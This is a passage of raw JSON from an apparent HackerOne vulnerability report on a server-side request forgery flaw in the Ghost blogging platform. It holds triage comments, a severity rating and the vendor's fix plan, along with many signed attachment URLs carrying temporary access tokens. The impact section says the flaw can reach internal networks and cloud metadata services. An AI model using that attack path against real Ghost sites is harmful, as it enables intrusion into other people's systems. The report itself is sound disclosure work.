jsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=7800f6412d2cb8ee4ebeb97060ee36dfaa53ff59fcb674eecac470cfbca32b5b","file_size":14189,"type":"image/jpeg"},{"id":713081,"file_name":"2020-02-11_17.56.17.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GGRKvEzhgCvMW6nYeGGkHkPZ?response-content-disposition=attachment%3B%20filename%3D%222020-02-11_17.56.17.jpg%22%3B%20filename%2A%3DUTF-8%27%272020-02-11_17.56.17.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065414Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=d88385627740f2a525d66a54fc202f57ed9902836959d5ed8690d1ae5cedc8ea","file_size":120399,"type":"image/jpeg"},{"id":713098,"file_name":"2020-02-11_17.07.09.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uhMWrcSeLT9gmA25QFQK5okF?response-content-disposition=attachment%3B%20filename%3D%222020-02-11_17.07.09.jpg%22%3B%20filename%2A%3DUTF-8%27%272020-02-11_17.07.09.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065414Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=fb742b234a8ea259366556de2f331eb0851866f261f39411d2ac1fff0d503cfe","file_size":82168,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2020-04-08T12:11:23.457Z","allow_singular_disclosure_after":-22876970.89781668,"singular_disclosure_allowed":true,"vote_count":35,"voters":["whoareme","ermilov","cdl","a_d_a_m","saddeann","mik317","macasun","powerjacobb1","andreystepanov","realtess","and 25 more..."],"severity":{"rating":"medium","score":4.4,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"high","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":49350,"asset_type":"SOURCE_CODE","asset_identifier":"Ghost","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7023112,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"# Impact\nAn attacker may be able to leverage this to make arbitrary GET requests in a Ghost Blog instance's internal network. It can also be used to connect to cloud provider's instance metadata API, which may result in the ability to execute commands on the machine.","markdown_message":"\u003ch1 id=\"impact\"\u003eImpact\u003c/h1\u003e\n\n\u003cp\u003eAn attacker may be able to leverage this to make arbitrary GET requests in a Ghost Blog instance\u0026#39;s internal network. It can also be used to connect to cloud provider\u0026#39;s instance metadata API, which may result in the ability to execute commands on the machine.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-11T16:58:22.927Z","updated_at":"2020-02-11T16:58:22.927Z","actor":{"username":"whoareme","cleared":false,"url":"/whoareme","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/a40cnveew0c5l32vsa2573lvscji/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22563170EF-27F4-4176-817B-5C52C262A16C.jpeg%22%3B%20filename%2A%3DUTF-8%27%27563170EF-27F4-4176-817B-5C52C262A16C.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065414Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=4538e54d1329291b77025bbbe7346786a2c0706036c969a239a6cd32617cd769"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7027155,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @whoareme,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@nochnoidozor","markdown_message":"\u003cp\u003eHi \u003ca href=\"/whoareme\"\u003e@whoareme\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/nochnoidozor\"\u003e@nochnoidozor\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-12T05:04:01.058Z","updated_at":"2020-02-12T05:04:01.058Z","actor":{"username":"nochnoidozor","cleared":false,"url":"/nochnoidozor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7027276,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @whoareme,\n\nthanks for the submission. I setup the environment in order to run ghost locally, anyway it's not clear how the attack should be performed. In your exploitation scenario I assume the attacker needs publisher role, therefore a new user needs to be created? Then it's enough to issue that request that you mentioned with the cookies of this new added user, and point it to the PoC html page served with the python http server?\n\nThanks for your collaboration,\n@nochnoidozor ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/whoareme\"\u003e@whoareme\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003ethanks for the submission. I setup the environment in order to run ghost locally, anyway it\u0026#39;s not clear how the attack should be performed. In your exploitation scenario I assume the attacker needs publisher role, therefore a new user needs to be created? Then it\u0026#39;s enough to issue that request that you mentioned with the cookies of this new added user, and point it to the PoC html page served with the python http server?\u003c/p\u003e\n\n\u003cp\u003eThanks for your collaboration,\u003cbr\u003e\n\u003ca href=\"/nochnoidozor\"\u003e@nochnoidozor\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-12T05:45:38.248Z","updated_at":"2020-02-12T05:45:38.248Z","actor":{"username":"nochnoidozor","cleared":false,"url":"/nochnoidozor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7041509,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @nochnoidozor, \n\nYou need to have credentials to the user which having enough permissions for login into admin page (website.com **/ghost/**). After that, you can try to exploit the SSRF vulnerability.\n\nI have recorded a short movie where I explain how you can do it.\n\nF715390","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nochnoidozor\"\u003e@nochnoidozor\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eYou need to have credentials to the user which having enough permissions for login into admin page (website.com \u003cstrong\u003e/ghost/\u003c/strong\u003e). After that, you can try to exploit the SSRF vulnerability.\u003c/p\u003e\n\n\u003cp\u003eI have recorded a short movie where I explain how you can do it.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"ssrf.mov\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/NpHJQ2LQ7PdTrg6GUQYBCcaE?response-content-disposition=attachment%3B%20filename%3D%22ssrf.mov%22%3B%20filename%2A%3DUTF-8%27%27ssrf.mov\u0026amp;response-content-type=video%2Fquicktime\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065414Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026amp;X-Amz-Signature=37f8002e8eef02a7175f3a732d6d77f4d152bd57a32c249cba58600ea701e160\" data-attachment-type=\"video/quicktime\"\u003essrf.mov (F715390)\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-13T13:09:26.494Z","updated_at":"2020-02-13T13:09:26.494Z","actor":{"username":"whoareme","cleared":false,"url":"/whoareme","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/a40cnveew0c5l32vsa2573lvscji/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22563170EF-27F4-4176-817B-5C52C262A16C.jpeg%22%3B%20filename%2A%3DUTF-8%27%27563170EF-27F4-4176-817B-5C52C262A16C.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065414Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=4538e54d1329291b77025bbbe7346786a2c0706036c969a239a6cd32617cd769"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":715390,"filename":"ssrf.mov","type":"video/quicktime","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/NpHJQ2LQ7PdTrg6GUQYBCcaE?response-content-disposition=attachment%3B%20filename%3D%22ssrf.mov%22%3B%20filename%2A%3DUTF-8%27%27ssrf.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065414Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=37f8002e8eef02a7175f3a732d6d77f4d152bd57a32c249cba58600ea701e160"}],"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7064994,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-16T14:29:01.363Z","updated_at":"2020-02-16T14:29:01.363Z","additional_data":{"old_severity":"High","new_severity":"Medium (4.4)","old_severity_id":630577,"new_severity_id":634914},"actor":{"username":"nochnoidozor","cleared":false,"url":"/nochnoidozor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7064996,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @whoareme,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@nochnoidozor","markdown_message":"\u003cp\u003eHello \u003ca href=\"/whoareme\"\u003e@whoareme\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/nochnoidozor\"\u003e@nochnoidozor\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-16T14:29:12.607Z","updated_at":"2020-02-16T14:29:12.607Z","actor":{"username":"nochnoidozor","cleared":false,"url":"/nochnoidozor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7078353,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-18T10:56:43.875Z","updated_at":"2020-02-18T10:56:43.875Z","actor":{"username":"info_uljnf","cleared":false,"url":"/info_uljnf","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7079718,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi 👋🏼\n\nKevin Ansfield from Ghost Foundation here. @whoareme alerted us to this vulnerability last week and we have an outline plan for fixing the issue that will roughly involve:\n\n1. Adding validation to the referenced `getOembedUrlFromHTML` function to ensure we are not returning any localhost/IP-address or non-http/https URLs.\n2. Adjusting the referenced `fetchOembedData` function to ensure that the response from any fetched resource is JSON and that the  returned object shape matches the oembed spec, then building our own response by cherry-picking required data rather than passing the fetched response straight through.\n\nBased on the disclosure date and our own triaging/classification we aim to have this fix in a public release within the next few weeks.\n\nWe'll reply here once the fix is public. If any further details are needed please let us know.","markdown_message":"\u003cp\u003eHi 👋🏼\u003c/p\u003e\n\n\u003cp\u003eKevin Ansfield from Ghost Foundation here. \u003ca href=\"/whoareme\"\u003e@whoareme\u003c/a\u003e alerted us to this vulnerability last week and we have an outline plan for fixing the issue that will roughly involve:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eAdding validation to the referenced \u003ccode\u003egetOembedUrlFromHTML\u003c/code\u003e function to ensure we are not returning any localhost/IP-address or non-http/https URLs.\u003c/li\u003e\n\u003cli\u003eAdjusting the referenced \u003ccode\u003efetchOembedData\u003c/code\u003e function to ensure that the response from any fetched resource is JSON and that the  returned object shape matches the oembed spec, then building our own response by cherry-picking required data rather than passing the fetched response straight through.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eBased on the disclosure date and our own triaging/classification we aim to have this fix in a public release within the next few weeks.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ll reply here once the fix is public. If any further details are needed please let us know.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-18T13:30:48.274Z","updated_at":"2020-02-18T13:30:48.274Z","actor":{"username":"info_uljnf","cleared":false,"url":"/info_uljnf","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7088844,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@info_uljnf many thanks for a detailed update! If it's OK for you, I would like to coordinate the responsible disclosure here on HackerOne, including issuing a CVE.","markdown_message":"\u003cp\u003e\u003ca href=\"/info_uljnf\"\u003e@info_uljnf\u003c/a\u003e many thanks for a detailed update! If it\u0026#39;s OK for you, I would like to coordinate the responsible disclosure here on HackerOne, including issuing a 